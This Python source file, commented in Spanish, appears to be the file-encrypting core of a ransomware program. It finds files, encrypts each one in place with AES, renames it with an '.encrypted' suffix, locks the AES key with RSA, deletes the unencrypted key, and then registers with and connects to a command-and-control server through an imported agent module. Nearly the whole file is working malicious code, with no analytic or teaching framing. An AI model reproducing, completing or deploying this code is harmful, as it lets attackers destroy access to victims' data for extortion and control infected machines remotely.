import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from find_files import  find_files
import gen_keys
import agent_c2

def load_aes_key():
    ruta_clave = os.path.abspath("aes_key.bin")
    if os.path.exists(ruta_clave):
        with open(ruta_clave, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")

def cifrar_archivo(archivo, clave):
    iv = os.urandom(16)  # Vector de inicialización
    cipher = AES.new(clave, AES.MODE_CBC, iv)
    with open(archivo, "rb") as f:
        datos = f.read()
    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
    with open(archivo, "wb") as f:
        f.write(iv + datos_cifrados)  # Guardamos IV + datos cifrados

def cifrar_clave_aes(clave_aes):
    gen_keys.generate_rsa_key()
    if not os.path.exists("rsa_public.pem"):
        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
    with open("rsa_public.pem", "rb") as f:
        clave_publica = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(clave_publica)
    clave_cifrada = cipher_rsa.encrypt(clave_aes)
    with open("aes_key_encrypted.bin", "wb") as f:
        f.write(clave_cifrada) 
    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
    if not os.path.exists("rsa_private.pem"):
        raise FileNotFoundError("El archivo de clave privada RSA 'rsa_private.pem' no se encuentra.")
    os.remove("aes_key.bin")
    agent_c2.register_agent()
    agent_c2.connect_to_server()

def cifrar_archivos():
    if not os.path.exists("aes_key.bin"): # Generar clave AES solo si no existe
        gen_keys.generate_aes_key()
    aes_key = load_aes_key()
    archivos = find_files()  # Ahora solo devuelve la lista de archivos (rutas completas)
    if not archivos or not isinstance(archivos, list):  # Verifica si `archivos` es válido
        print("Error: No se pudo obtener la lista de archivos o está vacía.")
        return
    for archivo in archivos:
        print(f"Intentando cifrar: {archivo}")  # Depuración
        if os.path.isfile(archivo):  # Asegura que es un archivo y no un directorio
            cifrar_archivo(archivo, aes_key)
            ruta_nueva = archivo + ".encrypted"
            try:# Generar clave AES solo si no existe
                os.rename(archivo, ruta_nueva)
                print(f"Archivo renombrado a: {ruta_nueva}")
            except OSError as e:
                print(f"Error al renombrar el archivo {archivo}: {e}")
    print("Archivos cifrados y renombrados correctamente.")
    cifrar_clave_aes(aes_key)    # Cifrar la clave AES con RSA y eliminar la clave simétrica sin cifrar

if __name__ == "__main__":
    cifrar_archivos()